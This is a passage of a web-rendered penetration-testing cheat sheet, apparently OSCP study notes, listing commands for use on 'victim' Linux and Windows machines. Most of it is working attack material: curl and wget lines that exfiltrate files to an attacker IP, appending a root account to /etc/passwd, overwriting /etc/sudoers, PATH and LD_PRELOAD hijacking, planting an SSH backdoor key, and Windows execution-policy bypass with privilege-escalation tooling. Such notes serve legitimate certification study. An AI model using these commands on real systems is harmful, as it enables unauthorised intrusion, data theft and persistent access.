</span><span id="__span-38-32"><a id="__codelineno-38-32" name="__codelineno-38-32" href="#__codelineno-38-32"></a>/proc/cpuinfo
</span><span id="__span-38-33"><a id="__codelineno-38-33" name="__codelineno-38-33" href="#__codelineno-38-33"></a>/proc/devices
</span><span id="__span-38-34"><a id="__codelineno-38-34" name="__codelineno-38-34" href="#__codelineno-38-34"></a>/proc/meminfo
</span><span id="__span-38-35"><a id="__codelineno-38-35" name="__codelineno-38-35" href="#__codelineno-38-35"></a>/proc/net/tcp
</span><span id="__span-38-36"><a id="__codelineno-38-36" name="__codelineno-38-36" href="#__codelineno-38-36"></a>/proc/net/udp
</span><span id="__span-38-37"><a id="__codelineno-38-37" name="__codelineno-38-37" href="#__codelineno-38-37"></a>/proc/self/cmdline
</span><span id="__span-38-38"><a id="__codelineno-38-38" name="__codelineno-38-38" href="#__codelineno-38-38"></a>/proc/self/environ
</span><span id="__span-38-39"><a id="__codelineno-38-39" name="__codelineno-38-39" href="#__codelineno-38-39"></a>/proc/self/mounts
</span><span id="__span-38-40"><a id="__codelineno-38-40" name="__codelineno-38-40" href="#__codelineno-38-40"></a>/proc/self/stat
</span><span id="__span-38-41"><a id="__codelineno-38-41" name="__codelineno-38-41" href="#__codelineno-38-41"></a>/proc/self/status
</span><span id="__span-38-42"><a id="__codelineno-38-42" name="__codelineno-38-42" href="#__codelineno-38-42"></a>/proc/version
</span></code></pre></div></li>
</ul>
<h3 id="file-transfer-download">📂File Transfer (Download)</h3>
<p><a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/file-transfer-techniques">More file transfer techniques</a></p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>wget<span class="w"> </span>http://ip:port<span class="w"> </span>-O<span class="w"> </span>/dir/file
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>wget<span class="w"> </span>ip:port<span class="w"> </span>-O<span class="w"> </span>/dir/file
</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>
</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>curl<span class="w"> </span>-O<span class="w"> </span>http://&lt;ip&gt;:&lt;port&gt;/&lt;file&gt;
</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>
</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="c1"># in case of ssh</span>
</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>scp<span class="w"> </span>-O<span class="w"> </span>-i<span class="w"> </span>priv_key<span class="w"> </span>kali_file<span class="w"> </span>user@IP:/victimpath<span class="w"> </span><span class="c1"># -O for backward compatibility</span>
</span></code></pre></div>
<h4 id="upload-exfiltration">(Upload) - Exfiltration</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>curl<span class="w"> </span>--data<span class="w"> </span>@file.txt<span class="w"> </span>http://&lt;ip&gt;:8000/mydump.txt
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>curl<span class="w"> </span>--data<span class="w"> </span><span class="s2">&quot;username=admin&amp;password=1234&quot;</span><span class="w"> </span>http://&lt;ip&gt;:8000/mydump.txt
</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>wget<span class="w"> </span>--method<span class="o">=</span>POST<span class="w"> </span>--body-file<span class="o">=</span>&lt;file_path&gt;<span class="w"> </span>http://ip:port/outfile
</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="c1"># in case of ssh</span>
</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>scp
</span></code></pre></div>
<h3 id="privesc-vectors">⬆ PrivEsc Vectors</h3>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c1"># Check Linux PrivEsc Methodology: [[Methodology For OSCP#🛠️ Privilege Escalation Vectors#🐧 Linux]] </span>
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>
</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="c1"># for automated priv esc vectors finding</span>
</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>chmod<span class="w"> </span>+x<span class="w"> </span>linpeas.sh<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>./linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>filename.txt<span class="w"> </span>
</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>
</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="c1"># if /etc/passwd writable then</span>
</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>mkpasswd<span class="w"> </span>-m<span class="w"> </span>sha-512<span class="w"> </span>newpasswordhere<span class="w">  </span><span class="c1"># same as below </span>
</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>openssl<span class="w"> </span>passwd<span class="w"> </span>w00t<span class="w">   </span><span class="c1"># generate passwd file hash </span>
</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;root2:$1$jHnmMC8j$eIN3rfj8J9NaKYjKLwt9M/:0:0:root:/root:/bin/bash&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/passwd
</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a>
</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a>
</span><span id="__span-41-12"><a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a>su
</span><span id="__span-41-13"><a id="__codelineno-41-13" name="__codelineno-41-13" href="#__codelineno-41-13"></a><span class="c1"># if /etc/shadow readable</span>
</span><span id="__span-41-14"><a id="__codelineno-41-14" name="__codelineno-41-14" href="#__codelineno-41-14"></a>unshadow<span class="w"> </span>passwd.txt<span class="w"> </span>shadow.txt<span class="w"> </span>&gt;<span class="w"> </span>passwords.txt<span class="w"> </span><span class="c1"># now crack it</span>
</span><span id="__span-41-15"><a id="__codelineno-41-15" name="__codelineno-41-15" href="#__codelineno-41-15"></a>
</span><span id="__span-41-16"><a id="__codelineno-41-16" name="__codelineno-41-16" href="#__codelineno-41-16"></a><span class="c1"># SUDO LD_PRELOAD</span>
</span><span id="__span-41-17"><a id="__codelineno-41-17" name="__codelineno-41-17" href="#__codelineno-41-17"></a>sudo<span class="w"> </span><span class="nv">LD_PRELOAD</span><span class="o">=</span>/home/user/ldpreload/shell.so<span class="w"> </span>find
</span><span id="__span-41-18"><a id="__codelineno-41-18" name="__codelineno-41-18" href="#__codelineno-41-18"></a>
</span><span id="__span-41-19"><a id="__codelineno-41-19" name="__codelineno-41-19" href="#__codelineno-41-19"></a>
</span><span id="__span-41-20"><a id="__codelineno-41-20" name="__codelineno-41-20" href="#__codelineno-41-20"></a><span class="c1"># SUID binary gtfobins</span>
</span><span id="__span-41-21"><a id="__codelineno-41-21" name="__codelineno-41-21" href="#__codelineno-41-21"></a>
</span><span id="__span-41-22"><a id="__codelineno-41-22" name="__codelineno-41-22" href="#__codelineno-41-22"></a><span class="c1"># [linux capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)</span>
</span><span id="__span-41-23"><a id="__codelineno-41-23" name="__codelineno-41-23" href="#__codelineno-41-23"></a>
</span><span id="__span-41-24"><a id="__codelineno-41-24" name="__codelineno-41-24" href="#__codelineno-41-24"></a>
</span><span id="__span-41-25"><a id="__codelineno-41-25" name="__codelineno-41-25" href="#__codelineno-41-25"></a><span class="c1"># sudoers file perms</span>
</span><span id="__span-41-26"><a id="__codelineno-41-26" name="__codelineno-41-26" href="#__codelineno-41-26"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;kali ALL=(root) NOPASSWD: ALL&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/sudoers
</span><span id="__span-41-27"><a id="__codelineno-41-27" name="__codelineno-41-27" href="#__codelineno-41-27"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;kali ALL=(ALL) NOPASSWD: ALL&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/sudoers
</span><span id="__span-41-28"><a id="__codelineno-41-28" name="__codelineno-41-28" href="#__codelineno-41-28"></a>
</span><span id="__span-41-29"><a id="__codelineno-41-29" name="__codelineno-41-29" href="#__codelineno-41-29"></a><span class="c1"># SUID Binaries</span>
</span><span id="__span-41-30"><a id="__codelineno-41-30" name="__codelineno-41-30" href="#__codelineno-41-30"></a><span class="c1"># shared object injection within SUID and SGID binary</span>
</span><span id="__span-41-31"><a id="__codelineno-41-31" name="__codelineno-41-31" href="#__codelineno-41-31"></a>strace<span class="w"> </span>/usr/local/bin/suid-binary<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-iE<span class="w"> </span><span class="s2">&quot;open|access|no such file&quot;</span>
</span><span id="__span-41-32"><a id="__codelineno-41-32" name="__codelineno-41-32" href="#__codelineno-41-32"></a>gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>-o<span class="w"> </span>/home/user/.config/libcalc.so<span class="w"> </span>/home/user/tools/suid/libcalc.c<span class="w">  </span><span class="c1"># add the malicious so in place of missing</span>
</span><span id="__span-41-33"><a id="__codelineno-41-33" name="__codelineno-41-33" href="#__codelineno-41-33"></a>
</span><span id="__span-41-34"><a id="__codelineno-41-34" name="__codelineno-41-34" href="#__codelineno-41-34"></a>
</span><span id="__span-41-35"><a id="__codelineno-41-35" name="__codelineno-41-35" href="#__codelineno-41-35"></a><span class="c1"># ABUSING SHELL FEATURES</span>
</span><span id="__span-41-36"><a id="__codelineno-41-36" name="__codelineno-41-36" href="#__codelineno-41-36"></a><span class="c1"># In Bash versions &lt;4.2-048, export functions to run instead of original executables</span>
</span><span id="__span-41-37"><a id="__codelineno-41-37" name="__codelineno-41-37" href="#__codelineno-41-37"></a><span class="k">function</span><span class="w"> </span>/usr/sbin/service<span class="w"> </span><span class="o">{</span><span class="w"> </span>/bin/bash<span class="w"> </span>-p<span class="p">;</span><span class="w"> </span><span class="o">}</span>
</span><span id="__span-41-38"><a id="__codelineno-41-38" name="__codelineno-41-38" href="#__codelineno-41-38"></a><span class="nb">export</span><span class="w"> </span>-f<span class="w"> </span>/usr/sbin/service
</span><span id="__span-41-39"><a id="__codelineno-41-39" name="__codelineno-41-39" href="#__codelineno-41-39"></a>
</span><span id="__span-41-40"><a id="__codelineno-41-40" name="__codelineno-41-40" href="#__codelineno-41-40"></a><span class="c1"># PATH Hijacking</span>
</span><span id="__span-41-41"><a id="__codelineno-41-41" name="__codelineno-41-41" href="#__codelineno-41-41"></a><span class="c1"># If a program (e.g. an SUID binary) invokes tools like `cat`, `ls`, or `ps` without full paths,</span>
</span><span id="__span-41-42"><a id="__codelineno-41-42" name="__codelineno-41-42" href="#__codelineno-41-42"></a><span class="c1"># you can place your malicious binary earlier in $PATH or manipulate $PATH variable and gain code execution under escalated privileges.</span>
</span><span id="__span-41-43"><a id="__codelineno-41-43" name="__codelineno-41-43" href="#__codelineno-41-43"></a>
</span><span id="__span-41-44"><a id="__codelineno-41-44" name="__codelineno-41-44" href="#__codelineno-41-44"></a><span class="c1"># Example: hijacking an SUID wrapper that runs `cat`</span>
</span><span id="__span-41-45"><a id="__codelineno-41-45" name="__codelineno-41-45" href="#__codelineno-41-45"></a>mkdir<span class="w"> </span>/tmp/attack<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/tmp/attack
</span><span id="__span-41-46"><a id="__codelineno-41-46" name="__codelineno-41-46" href="#__codelineno-41-46"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;exec /bin/sh&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>cat
</span><span id="__span-41-47"><a id="__codelineno-41-47" name="__codelineno-41-47" href="#__codelineno-41-47"></a>chmod<span class="w"> </span>+x<span class="w"> </span>cat
</span><span id="__span-41-48"><a id="__codelineno-41-48" name="__codelineno-41-48" href="#__codelineno-41-48"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;/tmp/attack:</span><span class="nv">$PATH</span><span class="s2">&quot;</span>
</span><span id="__span-41-49"><a id="__codelineno-41-49" name="__codelineno-41-49" href="#__codelineno-41-49"></a><span class="c1"># Now when the SUID binary runs `cat`, it executes your shell as root</span>
</span><span id="__span-41-50"><a id="__codelineno-41-50" name="__codelineno-41-50" href="#__codelineno-41-50"></a>
</span><span id="__span-41-51"><a id="__codelineno-41-51" name="__codelineno-41-51" href="#__codelineno-41-51"></a><span class="c1"># – Relative or unsanitized path usage in SUID/root scripts: placing tools in CWD or early in $PATH can hijack exec calls :contentReference[oaicite:0]{index=0}</span>
</span><span id="__span-41-52"><a id="__codelineno-41-52" name="__codelineno-41-52" href="#__codelineno-41-52"></a>
</span><span id="__span-41-53"><a id="__codelineno-41-53" name="__codelineno-41-53" href="#__codelineno-41-53"></a><span class="c1"># – Cron jobs or services invoking commands by name: if they use PATH and run as root, dropping malicious versions in a writable dir in PATH can hijack them :contentReference[oaicite:1]{index=1}</span>
</span><span id="__span-41-54"><a id="__codelineno-41-54" name="__codelineno-41-54" href="#__codelineno-41-54"></a>
</span><span id="__span-41-55"><a id="__codelineno-41-55" name="__codelineno-41-55" href="#__codelineno-41-55"></a><span class="c1"># – LD_PRELOAD hijacking: placing evil shared libs in LD_LIBRARY_PATH when root-set-exec runs dynamic binaries</span>
</span><span id="__span-41-56"><a id="__codelineno-41-56" name="__codelineno-41-56" href="#__codelineno-41-56"></a>
</span><span id="__span-41-57"><a id="__codelineno-41-57" name="__codelineno-41-57" href="#__codelineno-41-57"></a><span class="c1"># – Library hijacking: placing .so in writable library dirs or . relative CWD before system libs</span>
</span><span id="__span-41-58"><a id="__codelineno-41-58" name="__codelineno-41-58" href="#__codelineno-41-58"></a>
</span><span id="__span-41-59"><a id="__codelineno-41-59" name="__codelineno-41-59" href="#__codelineno-41-59"></a>
</span><span id="__span-41-60"><a id="__codelineno-41-60" name="__codelineno-41-60" href="#__codelineno-41-60"></a><span class="c1"># NFS Share, if root squashing is disabled</span>
</span><span id="__span-41-61"><a id="__codelineno-41-61" name="__codelineno-41-61" href="#__codelineno-41-61"></a><span class="c1"># Files created via NFS inherit the remote user&#39;s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the &quot;nobody&quot; user.</span>
</span><span id="__span-41-62"><a id="__codelineno-41-62" name="__codelineno-41-62" href="#__codelineno-41-62"></a>cat<span class="w"> </span>/etc/exports
</span><span id="__span-41-63"><a id="__codelineno-41-63" name="__codelineno-41-63" href="#__codelineno-41-63"></a>
</span><span id="__span-41-64"><a id="__codelineno-41-64" name="__codelineno-41-64" href="#__codelineno-41-64"></a><span class="c1"># on our kali machine</span>
</span><span id="__span-41-65"><a id="__codelineno-41-65" name="__codelineno-41-65" href="#__codelineno-41-65"></a>showmount<span class="w"> </span>-e<span class="w"> </span>target_ip
</span><span id="__span-41-66"><a id="__codelineno-41-66" name="__codelineno-41-66" href="#__codelineno-41-66"></a>mkdir<span class="w"> </span>/tmp/nfs<span class="w">  </span>
</span><span id="__span-41-67"><a id="__codelineno-41-67" name="__codelineno-41-67" href="#__codelineno-41-67"></a>mount<span class="w"> </span>-o<span class="w"> </span>rw,vers<span class="o">=</span><span class="m">3</span><span class="w"> </span>&lt;target_ip&gt;:/target_share<span class="w"> </span>/tmp/nfs
</span><span id="__span-41-68"><a id="__codelineno-41-68" name="__codelineno-41-68" href="#__codelineno-41-68"></a>
</span><span id="__span-41-69"><a id="__codelineno-41-69" name="__codelineno-41-69" href="#__codelineno-41-69"></a>
</span><span id="__span-41-70"><a id="__codelineno-41-70" name="__codelineno-41-70" href="#__codelineno-41-70"></a><span class="c1"># lxd/lxc and docker group priv esc</span>
</span><span id="__span-41-71"><a id="__codelineno-41-71" name="__codelineno-41-71" href="#__codelineno-41-71"></a><span class="c1">#</span>
</span><span id="__span-41-72"><a id="__codelineno-41-72" name="__codelineno-41-72" href="#__codelineno-41-72"></a><span class="c1"># [lxc/lxd Exploit](https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation?q=#method-2)</span>
</span><span id="__span-41-73"><a id="__codelineno-41-73" name="__codelineno-41-73" href="#__codelineno-41-73"></a><span class="c1"># [Docker group and more interesting groups](https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/interesting-groups-linux-pe#docker-group)</span>
</span><span id="__span-41-74"><a id="__codelineno-41-74" name="__codelineno-41-74" href="#__codelineno-41-74"></a><span class="c1"># More</span>
</span><span id="__span-41-75"><a id="__codelineno-41-75" name="__codelineno-41-75" href="#__codelineno-41-75"></a><span class="c1"># [priv esc using docker/lxd](https://materials.rangeforce.com/tutorial/2019/12/07/Privilege-Escalation-Docker-LXD-Groups/)</span>
</span><span id="__span-41-76"><a id="__codelineno-41-76" name="__codelineno-41-76" href="#__codelineno-41-76"></a>
</span><span id="__span-41-77"><a id="__codelineno-41-77" name="__codelineno-41-77" href="#__codelineno-41-77"></a>
</span><span id="__span-41-78"><a id="__codelineno-41-78" name="__codelineno-41-78" href="#__codelineno-41-78"></a><span class="c1"># Service Escalation</span>
</span><span id="__span-41-79"><a id="__codelineno-41-79" name="__codelineno-41-79" href="#__codelineno-41-79"></a>find<span class="w"> </span>/etc<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</span><span id="__span-41-80"><a id="__codelineno-41-80" name="__codelineno-41-80" href="#__codelineno-41-80"></a>/etc/systemd/system/pythonapp.service
</span><span id="__span-41-81"><a id="__codelineno-41-81" name="__codelineno-41-81" href="#__codelineno-41-81"></a>
</span><span id="__span-41-82"><a id="__codelineno-41-82" name="__codelineno-41-82" href="#__codelineno-41-82"></a>
</span><span id="__span-41-83"><a id="__codelineno-41-83" name="__codelineno-41-83" href="#__codelineno-41-83"></a><span class="c1"># SSH authorized keys (Check using nmap what type of ssh-hostkey SSH server will gonna accept)</span>
</span><span id="__span-41-84"><a id="__codelineno-41-84" name="__codelineno-41-84" href="#__codelineno-41-84"></a><span class="c1"># On the basis of ssh-hostkey change rsa,ecdsa and so on</span>
</span><span id="__span-41-85"><a id="__codelineno-41-85" name="__codelineno-41-85" href="#__codelineno-41-85"></a>ssh-keygen<span class="w"> </span>-t<span class="w"> </span>rsa<span class="w"> </span>-b<span class="w"> </span><span class="m">4096</span><span class="w"> </span>-f<span class="w"> </span>my_backdoor<span class="w"> </span>-N<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="c1"># on kali</span>
</span><span id="__span-41-86"><a id="__codelineno-41-86" name="__codelineno-41-86" href="#__codelineno-41-86"></a><span class="c1"># on victim</span>
</span><span id="__span-41-87"><a id="__codelineno-41-87" name="__codelineno-41-87" href="#__codelineno-41-87"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ssh-rsa AAAA...yourkey... attacker@host&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.ssh/authorized_keys
</span><span id="__span-41-88"><a id="__codelineno-41-88" name="__codelineno-41-88" href="#__codelineno-41-88"></a><span class="c1"># OR</span>
</span><span id="__span-41-89"><a id="__codelineno-41-89" name="__codelineno-41-89" href="#__codelineno-41-89"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>cat<span class="w"> </span>my_backdoor.pub<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>.ssh/authorized_keys<span class="err">&#39;</span>
</span></code></pre></div>
<h2 id="victim-windows-commands">🪟 <font color="#92cddc">Victim Windows Commands</font></h2>
<ul>
<li><a href="https://gist.github.com/HarmJ0y/bb48307ffa663256e239">Downloading malicious files on victim machine</a></li>
<li>Windows Enumeration tools https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</li>
</ul>
<h3 id="enumeration_1">🔍Enumeration</h3>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="c"># CMD or powershell</span>
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="p">(</span><span class="nb">dir </span><span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">*`|</span><span class="nb">echo </span><span class="n">CMD</span><span class="p">);&amp;</span><span class="cm">&lt;# rem #&gt;</span><span class="nb">echo </span><span class="n">PowerShell</span>
</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>
</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="nb">Get-ExecutionPolicy</span> <span class="n">-Scope</span> <span class="n">CurrentUser</span>
</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="nb">Set-ExecutionPolicy</span> <span class="n">-ExecutionPolicy</span> <span class="n">Unrestricted</span> <span class="n">-Scope</span> <span class="n">CurrentUser</span>
</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a><span class="nb">set-executionpolicy</span> <span class="n">-ep</span> <span class="n">bypass</span>
</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ep</span> <span class="n">Bypass</span> <span class="n">-c</span> <span class="s2">&quot;&quot;</span>
</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a>
</span><span id="__span-42-9"><a id="__codelineno-42-9" name="__codelineno-42-9" href="#__codelineno-42-9"></a><span class="c"># Automated Enumeration Tools </span>
</span><span id="__span-42-10"><a id="__codelineno-42-10" name="__codelineno-42-10" href="#__codelineno-42-10"></a><span class="n">jaws-enum</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-OutputFileName</span> <span class="n">Jaws-Enum</span><span class="p">.</span><span class="n">txt</span>   <span class="c"># [GitHub repo](https://github.com/411Hall/JAWS)</span>
</span><span id="__span-42-11"><a id="__codelineno-42-11" name="__codelineno-42-11" href="#__codelineno-42-11"></a><span class="n">winpeas</span>
</span><span id="__span-42-12"><a id="__codelineno-42-12" name="__codelineno-42-12" href="#__codelineno-42-12"></a><span class="n">seatbelt</span><span class="p">.</span><span class="n">exe</span> <span class="n">-group</span><span class="p">=</span><span class="n">all</span> 
</span><span id="__span-42-13"><a id="__codelineno-42-13" name="__codelineno-42-13" href="#__codelineno-42-13"></a>
</span><span id="__span-42-14"><a id="__codelineno-42-14" name="__codelineno-42-14" href="#__codelineno-42-14"></a><span class="c"># /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1  in linux</span>
</span><span id="__span-42-15"><a id="__codelineno-42-15" name="__codelineno-42-15" href="#__codelineno-42-15"></a><span class="p">.</span> <span class="p">.\</span><span class="n">powerup</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-42-16"><a id="__codelineno-42-16" name="__codelineno-42-16" href="#__codelineno-42-16"></a><span class="nb">Invoke-AllChcks</span>
</span><span id="__span-42-17"><a id="__codelineno-42-17" name="__codelineno-42-17" href="#__codelineno-42-17"></a><span class="nb">Get-ModifiableServiceFile</span>
</span><span id="__span-42-18"><a id="__codelineno-42-18" name="__codelineno-42-18" href="#__codelineno-42-18"></a><span class="nb">Get-ServiceUnquoted</span>
</span><span id="__span-42-19"><a id="__codelineno-42-19" name="__codelineno-42-19" href="#__codelineno-42-19"></a><span class="nb">Get-ModifiableScheduledTaskFile</span>
</span></code></pre></div>
<h4 id="user-system-info">User &amp; System info</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="nb">echo </span><span class="k">%</span><span class="n">USERNAME</span><span class="p">%</span> <span class="p">&amp;&amp;</span> <span class="n">whoami</span> <span class="p">&amp;&amp;</span> <span class="nv">$env:username</span>
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="nb">dir </span><span class="n">env</span><span class="p">:</span>
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">user</span>
</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a><span class="n">net</span> <span class="n">user</span>
</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="nb">Get-LocalUser</span>
</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a><span class="n">wmic</span> <span class="n">useraccount</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">sid</span>
</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a><span class="n">net</span> <span class="n">localgroup</span>
</span><span id="__span-43-10"><a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a><span class="nb">Get-LocalGroup</span>
</span><span id="__span-43-11"><a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a><span class="nb">Get-LocalGroupMember</span> <span class="n">groupname</span>
</span><span id="__span-43-12"><a id="__codelineno-43-12" name="__codelineno-43-12" href="#__codelineno-43-12"></a><span class="n">systeminfo</span>
</span><span id="__span-43-13"><a id="__codelineno-43-13" name="__codelineno-43-13" href="#__codelineno-43-13"></a><span class="n">wmic</span> <span class="n">os</span> <span class="n">get</span> <span class="n">version</span>
</span><span id="__span-43-14"><a id="__codelineno-43-14" name="__codelineno-43-14" href="#__codelineno-43-14"></a><span class="nb">Get-PSDrive</span>
</span><span id="__span-43-15"><a id="__codelineno-43-15" name="__codelineno-43-15" href="#__codelineno-43-15"></a>
</span><span id="__span-43-16"><a id="__codelineno-43-16" name="__codelineno-43-16" href="#__codelineno-43-16"></a><span class="c"># environment variable</span>
</span><span id="__span-43-17"><a id="__codelineno-43-17" name="__codelineno-43-17" href="#__codelineno-43-17"></a><span class="nb">Get-ChildItem</span><span class="p">/</span><span class="nb">dir </span><span class="n">Env</span><span class="p">:</span>
</span><span id="__span-43-18"><a id="__codelineno-43-18" name="__codelineno-43-18" href="#__codelineno-43-18"></a><span class="nb">set</span>
</span><span id="__span-43-19"><a id="__codelineno-43-19" name="__codelineno-43-19" href="#__codelineno-43-19"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKEY_USERS\&lt;UserSID&gt;\Environment&quot;</span>  <span class="c"># to query user specific env vars</span>
</span><span id="__span-43-20"><a id="__codelineno-43-20" name="__codelineno-43-20" href="#__codelineno-43-20"></a>
</span><span id="__span-43-21"><a id="__codelineno-43-21" name="__codelineno-43-21" href="#__codelineno-43-21"></a>
</span><span id="__span-43-22"><a id="__codelineno-43-22" name="__codelineno-43-22" href="#__codelineno-43-22"></a><span class="c"># Check if credential guard enabled, if yes then lsass dumping isn&#39;t possible at all using mimkatz</span>
</span><span id="__span-43-23"><a id="__codelineno-43-23" name="__codelineno-43-23" href="#__codelineno-43-23"></a><span class="nb">Get-ComputerInfo</span> <span class="c"># DeviceGuardSecurityServicesRunning is CredentialGuard</span>
</span><span id="__span-43-24"><a id="__codelineno-43-24" name="__codelineno-43-24" href="#__codelineno-43-24"></a><span class="c"># but still we can dump ntlm hashes of local users, not domain users</span>
</span><span id="__span-43-25"><a id="__codelineno-43-25" name="__codelineno-43-25" href="#__codelineno-43-25"></a>
</span><span id="__span-43-26"><a id="__codelineno-43-26" name="__codelineno-43-26" href="#__codelineno-43-26"></a><span class="c"># for getting arch info</span>
</span><span id="__span-43-27"><a id="__codelineno-43-27" name="__codelineno-43-27" href="#__codelineno-43-27"></a><span class="nb">echo </span><span class="nv">$env:PROCESSOR_ARCHITECTURE</span>
</span><span id="__span-43-28"><a id="__codelineno-43-28" name="__codelineno-43-28" href="#__codelineno-43-28"></a>
